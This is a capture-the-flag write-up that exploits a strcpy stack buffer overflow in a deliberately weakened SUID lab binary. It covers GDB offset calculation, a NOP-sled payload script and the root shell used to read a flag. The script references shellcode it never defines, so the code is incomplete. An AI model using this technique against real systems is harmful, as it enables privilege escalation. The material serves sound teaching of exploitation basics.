# Fuzzy Frame — Solution Writeup


## Overview

The vulnerable program reads up to 517 bytes from `badfile` and copies them into a fixed-size stack buffer using `strcpy()` with no bounds checking.

Because the binary is:

* SUID root
* non-PIE
* compiled without stack canaries
* compiled with an executable stack
* running with ASLR disabled

an attacker can overwrite the saved return address and redirect execution into attacker-controlled shellcode stored on the stack.

The goal is to gain a root shell and read:

```bash
/root/flag.txt
```

---

# Environment

The container is intentionally configured for stack-smashing exploitation.

## Protections disabled

* ASLR disabled
* Stack canaries disabled
* Stack marked executable
* PIE disabled

## Compile flags on executable

```bash
gcc -m32 -fno-stack-protector -z execstack -no-pie -g vuln.c -o vuln
```

## Shell behavior

The container links `/bin/sh` to `/bin/zsh` because some shells (like `dash`) drop privileges when executed from SUID programs.

```dockerfile
ln -sf /bin/zsh /bin/sh
```

---
# Step 0 - Build and connect
```bash
docker compose up -d --build
```

### Find the port
```bash
docker compose ps
```

### Connect
```bash
ssh ctf@<host> -p <port>
# password: ctf
```

# Step 1 — Inspect the source

```bash
cat source.c
```

Important parts:

```c
char buffer[BUF_SIZE];
strcpy(buffer, str);
```

`strcpy()` performs no bounds checking.

The input comes from:

```c
fread(str, sizeof(char), 517, badfile);
```

so up to 517 bytes may be copied into a much smaller stack buffer.

This allows:

* overwriting saved `%ebp`
* overwriting the saved return address
* redirecting execution into shellcode

---

# Step 2 — Start GDB

Create an empty payload file first:

```bash
touch badfile
```

Start GDB:

```bash
gdb ./vuln
```

Set a breakpoint:

```gdb
break bof
run
```

Execution stops at the beginning of the vulnerable function.

---

# Step 3 — Find the stack layout

Inside GDB:

```gdb
p &buffer
```

Output:

```gdb
$1 = (char (*)[232]) 0xffffd398
```

The stack buffer begins at:

```text
0xffffd398
```

Next:

```gdb
p $ebp
```

Output:

```gdb
$2 = (void *) 0xffffd488
```

Now calculate the exact offset to the saved return address:

```gdb
p/d ((char*)$ebp + 4) - (char*)&buffer
```

Output:

```gdb
$3 = 244
```

So:

* buffer starts at `0xffffd398`
* saved return address is 244 bytes above it

This means writing 244 bytes reaches EIP.

---

# Step 4 — Build the exploit payload

The payload contains:

1. a large NOP sled
2. shellcode
3. an overwritten return address pointing back into the sled

---


# Full exploit

```python
#!/usr/bin/env python3

content = bytearray(0x90 for _ in range(517))

start = 100
content[start:start+len(shellcode)] = shellcode

ret = 0xffffd3e8

offset = 244

content[offset:offset+4] = ret.to_bytes(4, byteorder="little")

with open("badfile", "wb") as f:
    f.write(content)

```

---

# Why the return address works

The buffer begins at:

```text
0xffffd398
```

The shellcode begins at:

```text
0xffffd398 + 100
```

The return address:

```text
0xffffd3e8
```

points safely into the NOP sled before the shellcode.

Execution lands in the sled and slides into the payload.

---

# Step 5 — Run the exploit

Generate the payload:

```bash
python3 exploit.py
```

Run the vulnerable binary:

```bash
./vuln
```

You should now have a root shell.


Read the flag:

```bash
cat /root/flag.txt
```

---

